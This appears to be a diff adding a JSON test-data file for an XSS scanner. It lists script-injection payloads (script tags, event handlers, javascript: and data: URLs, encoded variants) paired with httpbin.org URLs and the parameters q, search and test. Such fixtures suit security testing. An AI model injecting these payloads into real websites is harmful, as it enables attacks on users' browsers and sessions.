@@ -1,0 +1,506 @@
+[
+  {
+    "url": "https://httpbin.org/get?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "q",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "q",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "q",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+    "parameter": "q",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "q",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "q",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=javascript%3Aalert%28%27XSS%27%29",
+    "parameter": "q",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=data%3Atext/html%2C%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "q",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=vbscript%3Aalert%28%27XSS%27%29",
+    "parameter": "q",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%26lt%3Bscript%26gt%3Balert%28%27XSS%27%29%26lt%3B/script%26gt%3B",
+    "parameter": "q",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%253Cscript%253Ealert%28%27XSS%27%29%253C/script%253E",
+    "parameter": "q",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?q=%5Cx3Cscript%5Cx3Ealert%28%27XSS%27%29%5Cx3C/script%5Cx3E",
+    "parameter": "q",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "q",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "search",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "search",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "search",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+    "parameter": "search",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "search",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "search",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=javascript%3Aalert%28%27XSS%27%29",
+    "parameter": "search",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=data%3Atext/html%2C%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "search",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=vbscript%3Aalert%28%27XSS%27%29",
+    "parameter": "search",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%26lt%3Bscript%26gt%3Balert%28%27XSS%27%29%26lt%3B/script%26gt%3B",
+    "parameter": "search",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%253Cscript%253Ealert%28%27XSS%27%29%253C/script%253E",
+    "parameter": "search",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?search=%5Cx3Cscript%5Cx3Ealert%28%27XSS%27%29%5Cx3C/script%5Cx3E",
+    "parameter": "search",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "search",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "test",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "test",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "test",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "basic",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Cinput%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+    "parameter": "test",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<input onfocus=alert('XSS') autofocus>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "test",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%3Cdetails%20open%20ontoggle%3Dalert%28%27XSS%27%29%3E",
+    "parameter": "test",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "<details open ontoggle=alert('XSS')>",
+    "category": "event_handlers",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=javascript%3Aalert%28%27XSS%27%29",
+    "parameter": "test",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "javascript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=data%3Atext/html%2C%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E",
+    "parameter": "test",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "data:text/html,<script>alert('XSS')</script>",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=vbscript%3Aalert%28%27XSS%27%29",
+    "parameter": "test",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "vbscript:alert('XSS')",
+    "category": "javascript_urls",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%26lt%3Bscript%26gt%3Balert%28%27XSS%27%29%26lt%3B/script%26gt%3B",
+    "parameter": "test",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%253Cscript%253Ealert%28%27XSS%27%29%253C/script%253E",
+    "parameter": "test",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "category": "encoded",
+    "method": "POST"
+  },
+  {
+    "url": "https://httpbin.org/get?test=%5Cx3Cscript%5Cx3Ealert%28%27XSS%27%29%5Cx3C/script%5Cx3E",
+    "parameter": "test",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "GET"
+  },
+  {
+    "url": "https://httpbin.org/get",
+    "parameter": "test",
+    "payload": "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+    "category": "encoded",
+    "method": "POST"
+  }
+]
